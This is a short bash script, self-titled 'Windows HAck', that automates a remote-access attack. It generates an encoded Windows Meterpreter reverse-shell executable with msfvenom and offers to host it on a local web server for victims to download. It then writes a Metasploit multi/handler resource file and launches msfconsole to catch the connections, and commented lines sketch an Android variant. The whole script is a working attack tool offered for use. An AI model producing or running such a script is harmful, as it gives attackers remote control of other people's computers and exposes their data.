#!/bin/bash

clear
echo "########## Windows HAck ############ 
 ######### By -> Anurag Srivastava :) ########
"

ip=($(ifconfig eth0 | grep "inet addr" | cut -d ":" -f2 | awk '{print $1}'))
echo -n "Enter the desired  port [ENTER]: "
read port
echo -n "Enter your malicious executable's name [ENTER]: "
read name

echo "Please be patient , Generating payload "
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b "\x00" -e x86/shikata_ga_nai -f exe -o $name.exe

check=($(ls | grep $name.exe))


echo "Payload Generated "
echo "Here is your Exe :" $check
read -r -p "Do you want to send the payload to /var/www/html/  now ? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ ]]
then
     echo "Copying payload to /var/www/html "
        cp $name.exe /var/www/html/
        echo "Copied "
        echo "Your Url :"" ""http://"$ip"/"$name".exe"
        echo "use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST" ""$ip"
set LPORT" ""$port"
set ExitOnSession false
exploit -j -z" | tee listenerw.rc


echo "Now Starting Msf multi/handler for the above !"
msfconsole -r listenerw.rc
           # touch ~/meterpreter.rc
           # echo use exploit/multi/handler > ~/meterpreter.rc
           # echo set PAYLOAD android/meterpreter/reverse_tcp >> ~/meterpreter.rc
           # echo set LHOST $ip >> ~/meterpreter.rc
           # echo set LPORT $port >> ~/meterpreter.rc
           ## echo set ExitOnSession false >> ~/meterpreter.rc
           # echo exploit -j -z >> ~/meterpreter.rc


else
    echo "Okey ! Tc"
fi
sleep 10
echo "Thank You ! "
                    
